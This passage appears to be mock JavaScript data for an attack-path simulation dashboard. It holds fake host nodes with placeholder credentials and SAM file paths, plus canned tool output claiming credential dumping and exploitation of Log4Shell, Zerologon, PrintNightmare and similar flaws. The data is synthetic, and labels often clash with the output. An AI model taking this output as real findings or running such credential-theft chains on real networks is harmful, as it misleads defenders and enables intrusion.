      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\FTP-75-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\ftp-75:$ecr3t#75!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep76', node_type:'ASSET', node_label:'PROXY-76', node_hostname:'PROXY-76',
      node_ip:'10.10.0.13', node_platform:'Windows 11',
      node_status:'undetected',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
      node_accessed_files:['C:\\Logs\\PROXY-76-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\proxy-76:$ecr3t#76!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep77', node_type:'ASSET', node_label:'SIEM-77', node_hostname:'SIEM-77',
      node_ip:'10.10.0.14', node_platform:'Ubuntu 22.04 LTS',
      node_status:'undetected',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
      node_accessed_files:['C:\\Logs\\SIEM-77-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\siem-77:$ecr3t#77!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep78', node_type:'ASSET', node_label:'LDAP-78', node_hostname:'LDAP-78',
      node_ip:'10.10.0.15', node_platform:'Ubuntu 20.04 LTS',
      node_status:'detected',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
      node_accessed_files:['C:\\Logs\\LDAP-78-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\ldap-78:$ecr3t#78!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep79', node_type:'ASSET', node_label:'MGMT-79', node_hostname:'MGMT-79',
      node_ip:'10.10.0.16', node_platform:'CentOS 7',
      node_status:'undetected',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
      node_accessed_files:['C:\\Logs\\MGMT-79-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\mgmt-79:$ecr3t#79!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep80', node_type:'ASSET', node_label:'DEV-80', node_hostname:'DEV-80',
      node_ip:'10.10.0.17', node_platform:'Red Hat 8',
      node_status:'undetected',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
      node_accessed_files:['C:\\Logs\\DEV-80-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\dev-80:$ecr3t#80!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep81', node_type:'ASSET', node_label:'WEB-81', node_hostname:'WEB-81',
      node_ip:'10.10.0.18', node_platform:'Windows Server 2019',
      node_status:'detected',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
      node_accessed_files:['C:\\Logs\\WEB-81-access.log','C:\\Windows\\System32\\config\\SAM'],
      node_credentials_found:['CORP\\web-81:$ecr3t#81!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep82', node_type:'ASSET', node_label:'APP-82', node_hostname:'APP-82',
      node_ip:'10.10.0.19', node_platform:'Windows Server 2022',
      node_status:'undetected',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep83', node_type:'ASSET', node_label:'DB-83', node_hostname:'DB-83',
      node_ip:'10.10.0.20', node_platform:'Windows 10',
      node_untouched:true, node_status:'pending',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep84', node_type:'ASSET', node_label:'FILE-84', node_hostname:'FILE-84',
      node_ip:'10.10.0.21', node_platform:'Windows 11',
      node_untouched:true, node_status:'pending',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s6_90EP-ep85', node_type:'ASSET', node_label:'MAIL-85', node_hostname:'MAIL-85',
      node_ip:'10.10.0.22', node_platform:'Ubuntu 22.04 LTS',
      node_untouched:true, node_status:'pending',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep86', node_type:'ASSET', node_label:'JUMP-86', node_hostname:'JUMP-86',
      node_ip:'10.10.0.23', node_platform:'Ubuntu 20.04 LTS',
      node_untouched:true, node_status:'pending',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
    node_agents:['palo_alto', 'sentinel_one'],
    },
    { node_id:'s6_90EP-ep87', node_type:'ASSET', node_label:'PRINT-87', node_hostname:'PRINT-87',
      node_ip:'10.10.0.24', node_platform:'CentOS 7',
      node_untouched:true, node_status:'pending',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep88', node_type:'ASSET', node_label:'DNS-88', node_hostname:'DNS-88',
      node_ip:'10.10.0.25', node_platform:'Red Hat 8',
      node_untouched:true, node_status:'pending',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep89', node_type:'ASSET', node_label:'DC-89', node_hostname:'DC-89',
      node_ip:'10.10.0.26', node_platform:'Windows Server 2019',
      node_untouched:true, node_status:'pending',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s6_90EP-ep90', node_type:'ASSET', node_label:'WS-90', node_hostname:'WS-90',
      node_ip:'10.10.0.27', node_platform:'Windows Server 2022',
      node_untouched:true, node_status:'pending',
      node_zone:'Domain Core', node_subnet:'10.10.0.0/24',
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },

    // ── ACTION nodes ──
    { node_id:'s6_90EP-act01', node_type:'ACTION', node_label:'nmap on WEB-01',
      node_status:'undetected', node_executed_at:'2026-05-23T09:01:35.000Z', node_agent:'sentinel_one',
      node_terminal_output:`[*] Executing nmap against WEB-01\n[*] Target: WEB-01 (10.x.x.10)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act02', node_type:'ACTION', node_label:'netexec on APP-02',
      node_status:'undetected', node_executed_at:'2026-05-23T09:03:22.000Z', node_agent:'palo_alto',
      node_terminal_output:`[*] Executing netexec against APP-02\n[*] Target: APP-02 (10.x.x.11)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act03', node_type:'ACTION', node_label:'mimikatz on DB-03',
      node_status:'undetected', node_executed_at:'2026-05-23T09:05:21.000Z', node_agent:'palo_alto',
      node_terminal_output:`[*] Executing mimikatz against DB-03\n[*] Target: DB-03 (10.x.x.12)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act04', node_type:'ACTION', node_label:'crackmapexec on FILE-04',
      node_status:'detected', node_executed_at:'2026-05-23T09:07:32.000Z', node_agent:'palo_alto',
      node_terminal_output:`[nuclei] CVE-2021-44228 (Log4Shell) [critical]
[*] Target: FILE-04 (10.0.0.13)
[+] Vulnerable log4j-2.14.1 detected
[+] JNDI injection via User-Agent header
[+] DNS callback confirmed RCE
[+] Shell obtained as root`,
    },
    { node_id:'s6_90EP-act05', node_type:'ACTION', node_label:'bloodhound on MAIL-05',
      node_status:'prevented', node_executed_at:'2026-05-23T09:09:55.000Z', node_agent:'sentinel_one',
      node_terminal_output:`[*] Executing bloodhound against MAIL-05\n[*] Target: MAIL-05 (10.x.x.14)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[-] Action blocked by EDR`,
    },
    { node_id:'s6_90EP-act06', node_type:'ACTION', node_label:'rubeus on MGMT-19',
      node_status:'undetected', node_executed_at:'2026-05-23T09:12:30.000Z', node_agent:'sentinel_one',
      node_terminal_output:`[*] Executing rubeus against MGMT-19\n[*] Target: MGMT-19 (10.x.x.15)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act07', node_type:'ACTION', node_label:'wmiexec on DEV-20',
      node_status:'undetected', node_executed_at:'2026-05-23T09:15:17.000Z', node_agent:'openaev',
      node_terminal_output:`Starting Nmap 7.94 ( https://nmap.org ) at 2026-05-20 08:00 UTC
Nmap scan report for PRINT-07 (10.0.0.16)
Host is up (0.003s latency).
80/tcp   open  http
443/tcp  open  https
631/tcp  open  ipp

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds`,
    },
    { node_id:'s6_90EP-act08', node_type:'ACTION', node_label:'psexec on WEB-21',
      node_status:'undetected', node_executed_at:'2026-05-23T09:18:16.000Z', node_agent:'openaev',
      node_terminal_output:`[*] Executing psexec against WEB-21\n[*] Target: WEB-21 (10.x.x.17)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act09', node_type:'ACTION', node_label:'nmap on APP-22',
      node_status:'detected', node_executed_at:'2026-05-23T09:21:27.000Z', node_agent:'openaev',
      node_terminal_output:`[*] Executing nmap against APP-22\n[*] Target: APP-22 (10.x.x.18)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[!] Alert triggered — proceeding stealthily`,
    },
    { node_id:'s6_90EP-act10', node_type:'ACTION', node_label:'netexec on DB-23',
      node_status:'prevented', node_executed_at:'2026-05-23T09:24:50.000Z', node_agent:'sentinel_one',
      node_terminal_output:`[nuclei] CVE-2021-41773 (Apache RCE) [critical]
[*] Target: WS-10 (10.0.0.19)
[+] Apache 2.4.49 detected
[+] Path traversal + RCE via mod_cgi
[+] Shell as www-data -> root escalation`,
    },
    { node_id:'s6_90EP-act11', node_type:'ACTION', node_label:'mimikatz on FILE-24',
      node_status:'undetected', node_executed_at:'2026-05-23T09:28:25.000Z', node_agent:'openaev',
      node_terminal_output:`[*] Executing mimikatz against FILE-24\n[*] Target: FILE-24 (10.x.x.20)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act12', node_type:'ACTION', node_label:'crackmapexec on MAIL-25',
      node_status:'undetected', node_executed_at:'2026-05-23T09:32:12.000Z', node_agent:'palo_alto',
      node_terminal_output:`[*] Executing crackmapexec against MAIL-25\n[*] Target: MAIL-25 (10.x.x.21)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act13', node_type:'ACTION', node_label:'bloodhound on JUMP-26',
      node_status:'undetected', node_executed_at:'2026-05-23T09:36:11.000Z', node_agent:'sentinel_one',
      node_terminal_output:`[*] Executing bloodhound against JUMP-26\n[*] Target: JUMP-26 (10.x.x.22)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act14', node_type:'ACTION', node_label:'rubeus on PRINT-27',
      node_status:'detected', node_executed_at:'2026-05-23T09:40:22.000Z', node_agent:'sentinel_one',
      node_terminal_output:`[*] Executing rubeus against PRINT-27\n[*] Target: PRINT-27 (10.x.x.23)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[!] Alert triggered — proceeding stealthily`,
    },
    { node_id:'s6_90EP-act15', node_type:'ACTION', node_label:'wmiexec on SIEM-37',
      node_status:'prevented', node_executed_at:'2026-05-23T09:44:45.000Z', node_agent:'palo_alto',
      node_terminal_output:`Starting Nmap 7.94 ( https://nmap.org ) at 2026-05-20 08:00 UTC
Nmap scan report for SIEM-15 (10.0.0.24)
Host is up (0.003s latency).
22/tcp   open  ssh
514/tcp  open  syslog
9000/tcp open  cslistener

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds`,
    },
    { node_id:'s6_90EP-act16', node_type:'ACTION', node_label:'psexec on LDAP-38',
      node_status:'undetected', node_executed_at:'2026-05-23T09:49:20.000Z', node_agent:'openaev',
      node_terminal_output:`[*] Executing psexec against LDAP-38\n[*] Target: LDAP-38 (10.x.x.25)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act17', node_type:'ACTION', node_label:'nmap on MGMT-39',
      node_status:'undetected', node_executed_at:'2026-05-23T09:54:07.000Z', node_agent:'openaev',
      node_terminal_output:`[*] Executing nmap against MGMT-39\n[*] Target: MGMT-39 (10.x.x.26)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act18', node_type:'ACTION', node_label:'netexec on DEV-40',
      node_status:'undetected', node_executed_at:'2026-05-23T09:59:06.000Z', node_agent:'openaev',
      node_terminal_output:`[*] Executing netexec against DEV-40\n[*] Target: DEV-40 (10.x.x.27)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act19', node_type:'ACTION', node_label:'mimikatz on WEB-41',
      node_status:'detected', node_executed_at:'2026-05-23T10:04:17.000Z', node_agent:'openaev',
      node_terminal_output:`[*] Executing mimikatz against WEB-41\n[*] Target: WEB-41 (10.x.x.28)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[!] Alert triggered — proceeding stealthily`,
    },
    { node_id:'s6_90EP-act20', node_type:'ACTION', node_label:'crackmapexec on APP-42',
      node_status:'prevented', node_executed_at:'2026-05-23T10:09:40.000Z', node_agent:'palo_alto',
      node_terminal_output:`[*] Executing crackmapexec against APP-42\n[*] Target: APP-42 (10.x.x.29)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[-] Action blocked by EDR`,
    },
    { node_id:'s6_90EP-act21', node_type:'ACTION', node_label:'bloodhound on DB-43',
      node_status:'undetected', node_executed_at:'2026-05-23T10:15:15.000Z', node_agent:'palo_alto',
      node_terminal_output:`[*] Executing bloodhound against DB-43\n[*] Target: DB-43 (10.x.x.30)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act22', node_type:'ACTION', node_label:'rubeus on FILE-44',
      node_status:'undetected', node_executed_at:'2026-05-23T10:21:02.000Z', node_agent:'palo_alto',
      node_terminal_output:`[nuclei] CVE-2021-34527 (PrintNightmare) [critical]
[*] Target: PRINT-22 (10.0.1.11)
[+] Windows Print Spooler detected (spoolsv.exe)
[+] RCE via AddPrinterDriverEx() - arbitrary DLL load
[+] Privilege escalated to SYSTEM
[+] Host fully compromised`,
    },
    { node_id:'s6_90EP-act23', node_type:'ACTION', node_label:'wmiexec on MAIL-45',
      node_status:'undetected', node_executed_at:'2026-05-23T10:27:01.000Z', node_agent:'palo_alto',
      node_terminal_output:`[*] Executing wmiexec against MAIL-45\n[*] Target: MAIL-45 (10.x.x.32)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act24', node_type:'ACTION', node_label:'psexec on JUMP-46',
      node_status:'detected', node_executed_at:'2026-05-23T10:33:12.000Z', node_agent:'openaev',
      node_terminal_output:`[*] Executing psexec against JUMP-46\n[*] Target: JUMP-46 (10.x.x.33)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[!] Alert triggered — proceeding stealthily`,
    },
    { node_id:'s6_90EP-act25', node_type:'ACTION', node_label:'nmap on PRINT-47',
      node_status:'prevented', node_executed_at:'2026-05-23T10:39:35.000Z', node_agent:'sentinel_one',
      node_terminal_output:`[*] Executing nmap against PRINT-47\n[*] Target: PRINT-47 (10.x.x.34)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[-] Action blocked by EDR`,
    },
    { node_id:'s6_90EP-act26', node_type:'ACTION', node_label:'netexec on FTP-55',
      node_status:'undetected', node_executed_at:'2026-05-23T10:46:10.000Z', node_agent:'palo_alto',
      node_terminal_output:`[*] Executing netexec against FTP-55\n[*] Target: FTP-55 (10.x.x.35)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act27', node_type:'ACTION', node_label:'mimikatz on PROXY-56',
      node_status:'undetected', node_executed_at:'2026-05-23T10:52:57.000Z', node_agent:'sentinel_one',
      node_terminal_output:`[*] Executing mimikatz against PROXY-56\n[*] Target: PROXY-56 (10.x.x.36)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act28', node_type:'ACTION', node_label:'crackmapexec on SIEM-57',
      node_status:'undetected', node_executed_at:'2026-05-23T10:59:56.000Z', node_agent:'palo_alto',
      node_terminal_output:`Starting Nmap 7.94 ( https://nmap.org ) at 2026-05-20 08:00 UTC
Nmap scan report for MONITOR-28 (10.0.1.17)
Host is up (0.003s latency).
161/udp  open  snmp
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds`,
    },
    { node_id:'s6_90EP-act29', node_type:'ACTION', node_label:'bloodhound on LDAP-58',
      node_status:'detected', node_executed_at:'2026-05-23T11:07:07.000Z', node_agent:'openaev',
      node_terminal_output:`[*] Executing bloodhound against LDAP-58\n[*] Target: LDAP-58 (10.x.x.38)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[!] Alert triggered — proceeding stealthily`,
    },
    { node_id:'s6_90EP-act30', node_type:'ACTION', node_label:'rubeus on MGMT-59',
      node_status:'prevented', node_executed_at:'2026-05-23T11:14:30.000Z', node_agent:'openaev',
      node_terminal_output:`[nuclei] CVE-2021-34473 (ProxyShell) [critical]
[*] Target: MAIL-30 (10.0.1.19)
[+] Microsoft Exchange 15.1.2375 detected
[+] Authentication bypass via /autodiscover
[+] RCE via EWS - shell obtained
[+] Host fully compromised`,
    },
    { node_id:'s6_90EP-act31', node_type:'ACTION', node_label:'wmiexec on DEV-60',
      node_status:'undetected', node_executed_at:'2026-05-23T11:22:05.000Z', node_agent:'sentinel_one',
      node_terminal_output:`[*] Executing wmiexec against DEV-60\n[*] Target: DEV-60 (10.x.x.40)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act32', node_type:'ACTION', node_label:'psexec on WEB-61',
      node_status:'undetected', node_executed_at:'2026-05-23T11:29:52.000Z', node_agent:'palo_alto',
      node_terminal_output:`[*] Executing psexec against WEB-61\n[*] Target: WEB-61 (10.x.x.41)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act33', node_type:'ACTION', node_label:'nmap on APP-62',
      node_status:'undetected', node_executed_at:'2026-05-23T11:37:51.000Z', node_agent:'openaev',
      node_terminal_output:`[*] Executing nmap against APP-62\n[*] Target: APP-62 (10.x.x.42)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act34', node_type:'ACTION', node_label:'netexec on DB-63',
      node_status:'detected', node_executed_at:'2026-05-23T11:46:02.000Z', node_agent:'sentinel_one',
      node_terminal_output:`[*] Executing netexec against DB-63\n[*] Target: DB-63 (10.x.x.43)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[!] Alert triggered — proceeding stealthily`,
    },
    { node_id:'s6_90EP-act35', node_type:'ACTION', node_label:'mimikatz on FILE-64',
      node_status:'prevented', node_executed_at:'2026-05-23T11:54:25.000Z', node_agent:'openaev',
      node_terminal_output:`[*] Executing mimikatz against FILE-64\n[*] Target: FILE-64 (10.x.x.44)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[-] Action blocked by EDR`,
    },
    { node_id:'s6_90EP-act36', node_type:'ACTION', node_label:'crackmapexec on MAIL-65',
      node_status:'undetected', node_executed_at:'2026-05-23T12:03:00.000Z', node_agent:'palo_alto',
      node_terminal_output:`[*] Executing crackmapexec against MAIL-65\n[*] Target: MAIL-65 (10.x.x.45)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act37', node_type:'ACTION', node_label:'bloodhound on JUMP-66',
      node_status:'undetected', node_executed_at:'2026-05-23T12:11:47.000Z', node_agent:'openaev',
      node_terminal_output:`[*] Executing bloodhound against JUMP-66\n[*] Target: JUMP-66 (10.x.x.46)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act38', node_type:'ACTION', node_label:'rubeus on MONITOR-73',
      node_status:'undetected', node_executed_at:'2026-05-23T12:20:46.000Z', node_agent:'openaev',
      node_terminal_output:`[nuclei] CVE-2022-22965 (Spring4Shell) [critical]
[*] Target: DB-38 (10.0.2.7)
[+] Spring Framework 5.3.17 detected
[+] DataBinder classLoader hijacking
[+] JSP webshell uploaded
[+] RCE confirmed as tomcat -> root`,
    },
    { node_id:'s6_90EP-act39', node_type:'ACTION', node_label:'wmiexec on VPN-74',
      node_status:'detected', node_executed_at:'2026-05-23T12:29:57.000Z', node_agent:'openaev',
      node_terminal_output:`[*] Executing wmiexec against VPN-74\n[*] Target: VPN-74 (10.x.x.48)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[!] Alert triggered — proceeding stealthily`,
    },
    { node_id:'s6_90EP-act40', node_type:'ACTION', node_label:'psexec on FTP-75',
      node_status:'prevented', node_executed_at:'2026-05-23T12:39:20.000Z', node_agent:'palo_alto',
      node_terminal_output:`[*] Executing psexec against FTP-75\n[*] Target: FTP-75 (10.x.x.49)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[-] Action blocked by EDR`,
    },
    { node_id:'s6_90EP-act41', node_type:'ACTION', node_label:'nmap on PROXY-76',
      node_status:'undetected', node_executed_at:'2026-05-23T12:48:55.000Z', node_agent:'palo_alto',
      node_terminal_output:`Starting Nmap 7.94 ( https://nmap.org ) at 2026-05-20 08:00 UTC
Nmap scan report for VPN-41 (10.0.2.10)
Host is up (0.003s latency).
22/tcp   open  ssh
1194/udp open  openvpn

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds`,
    },
    { node_id:'s6_90EP-act42', node_type:'ACTION', node_label:'netexec on SIEM-77',
      node_status:'undetected', node_executed_at:'2026-05-23T12:58:42.000Z', node_agent:'sentinel_one',
      node_terminal_output:`[*] Executing netexec against SIEM-77\n[*] Target: SIEM-77 (10.x.x.51)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act43', node_type:'ACTION', node_label:'mimikatz on LDAP-78',
      node_status:'undetected', node_executed_at:'2026-05-23T13:08:41.000Z', node_agent:'sentinel_one',
      node_terminal_output:`[*] Executing mimikatz against LDAP-78\n[*] Target: LDAP-78 (10.x.x.52)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act44', node_type:'ACTION', node_label:'crackmapexec on MGMT-79',
      node_status:'detected', node_executed_at:'2026-05-23T13:18:52.000Z', node_agent:'sentinel_one',
      node_terminal_output:`[nuclei] CVE-2020-1472 (Zerologon) [critical]
[*] Target: DC-44 (192.168.1.13)
[+] Domain Controller detected
[+] Netlogon brute-force - machine account reset
[+] DCSync: all domain hashes dumped
[+] Domain fully compromised`,
    },
    { node_id:'s6_90EP-act45', node_type:'ACTION', node_label:'bloodhound on DEV-80',
      node_status:'prevented', node_executed_at:'2026-05-23T13:29:15.000Z', node_agent:'palo_alto',
      node_terminal_output:`[*] Executing bloodhound against DEV-80\n[*] Target: DEV-80 (10.x.x.54)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[-] Action blocked by EDR`,
    },
    { node_id:'s6_90EP-act46', node_type:'ACTION', node_label:'rubeus on WEB-81',
      node_status:'undetected', node_executed_at:'2026-05-23T13:39:50.000Z', node_agent:'palo_alto',
      node_terminal_output:`[*] Executing rubeus against WEB-81\n[*] Target: WEB-81 (10.x.x.55)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },
    { node_id:'s6_90EP-act47', node_type:'ACTION', node_label:'wmiexec on APP-82',
      node_status:'undetected', node_executed_at:'2026-05-23T13:50:37.000Z', node_agent:'palo_alto',
      node_terminal_output:`[*] Executing wmiexec against APP-82\n[*] Target: APP-82 (10.x.x.56)\n[+] Authentication: NTLM\n[+] Shares: ADMIN$ C$ IPC$\n[+] Success — dumping credentials`,
    },

  ],
  attack_path_edges: [
    // ── Edges ──
    { edge_id:'s6_90EP-e-al-1', edge_type:'asset_link', edge_source:'s6_90EP-act01', edge_target:'s6_90EP-ep01' },
    { edge_id:'s6_90EP-e-al-2', edge_type:'asset_link', edge_source:'s6_90EP-act02', edge_target:'s6_90EP-ep02' },
    { edge_id:'s6_90EP-e-al-3', edge_type:'asset_link', edge_source:'s6_90EP-act03', edge_target:'s6_90EP-ep03' },
    { edge_id:'s6_90EP-e-al-4', edge_type:'asset_link', edge_source:'s6_90EP-act04', edge_target:'s6_90EP-ep04' },
    { edge_id:'s6_90EP-e-al-5', edge_type:'asset_link', edge_source:'s6_90EP-act05', edge_target:'s6_90EP-ep05' },
    { edge_id:'s6_90EP-e-al-6', edge_type:'asset_link', edge_source:'s6_90EP-act06', edge_target:'s6_90EP-ep19' },
    { edge_id:'s6_90EP-e-al-7', edge_type:'asset_link', edge_source:'s6_90EP-act07', edge_target:'s6_90EP-ep20' },
    { edge_id:'s6_90EP-e-al-8', edge_type:'asset_link', edge_source:'s6_90EP-act08', edge_target:'s6_90EP-ep21' },
    { edge_id:'s6_90EP-e-al-9', edge_type:'asset_link', edge_source:'s6_90EP-act09', edge_target:'s6_90EP-ep22' },
    { edge_id:'s6_90EP-e-al-10', edge_type:'asset_link', edge_source:'s6_90EP-act10', edge_target:'s6_90EP-ep23' },
    { edge_id:'s6_90EP-e-al-11', edge_type:'asset_link', edge_source:'s6_90EP-act11', edge_target:'s6_90EP-ep24' },
    { edge_id:'s6_90EP-e-al-12', edge_type:'asset_link', edge_source:'s6_90EP-act12', edge_target:'s6_90EP-ep25' },
    { edge_id:'s6_90EP-e-al-13', edge_type:'asset_link', edge_source:'s6_90EP-act13', edge_target:'s6_90EP-ep26' },
    { edge_id:'s6_90EP-e-al-14', edge_type:'asset_link', edge_source:'s6_90EP-act14', edge_target:'s6_90EP-ep27' },
    { edge_id:'s6_90EP-e-al-15', edge_type:'asset_link', edge_source:'s6_90EP-act15', edge_target:'s6_90EP-ep37' },
    { edge_id:'s6_90EP-e-al-16', edge_type:'asset_link', edge_source:'s6_90EP-act16', edge_target:'s6_90EP-ep38' },
    { edge_id:'s6_90EP-e-al-17', edge_type:'asset_link', edge_source:'s6_90EP-act17', edge_target:'s6_90EP-ep39' },
    { edge_id:'s6_90EP-e-al-18', edge_type:'asset_link', edge_source:'s6_90EP-act18', edge_target:'s6_90EP-ep40' },
    { edge_id:'s6_90EP-e-al-19', edge_type:'asset_link', edge_source:'s6_90EP-act19', edge_target:'s6_90EP-ep41' },
    { edge_id:'s6_90EP-e-al-20', edge_type:'asset_link', edge_source:'s6_90EP-act20', edge_target:'s6_90EP-ep42' },
    { edge_id:'s6_90EP-e-al-21', edge_type:'asset_link', edge_source:'s6_90EP-act21', edge_target:'s6_90EP-ep43' },
    { edge_id:'s6_90EP-e-al-22', edge_type:'asset_link', edge_source:'s6_90EP-act22', edge_target:'s6_90EP-ep44' },
    { edge_id:'s6_90EP-e-al-23', edge_type:'asset_link', edge_source:'s6_90EP-act23', edge_target:'s6_90EP-ep45' },
    { edge_id:'s6_90EP-e-al-24', edge_type:'asset_link', edge_source:'s6_90EP-act24', edge_target:'s6_90EP-ep46' },
    { edge_id:'s6_90EP-e-al-25', edge_type:'asset_link', edge_source:'s6_90EP-act25', edge_target:'s6_90EP-ep47' },
    { edge_id:'s6_90EP-e-al-26', edge_type:'asset_link', edge_source:'s6_90EP-act26', edge_target:'s6_90EP-ep55' },
    { edge_id:'s6_90EP-e-al-27', edge_type:'asset_link', edge_source:'s6_90EP-act27', edge_target:'s6_90EP-ep56' },
    { edge_id:'s6_90EP-e-al-28', edge_type:'asset_link', edge_source:'s6_90EP-act28', edge_target:'s6_90EP-ep57' },
    { edge_id:'s6_90EP-e-al-29', edge_type:'asset_link', edge_source:'s6_90EP-act29', edge_target:'s6_90EP-ep58' },
    { edge_id:'s6_90EP-e-al-30', edge_type:'asset_link', edge_source:'s6_90EP-act30', edge_target:'s6_90EP-ep59' },
    { edge_id:'s6_90EP-e-al-31', edge_type:'asset_link', edge_source:'s6_90EP-act31', edge_target:'s6_90EP-ep60' },
    { edge_id:'s6_90EP-e-al-32', edge_type:'asset_link', edge_source:'s6_90EP-act32', edge_target:'s6_90EP-ep61' },
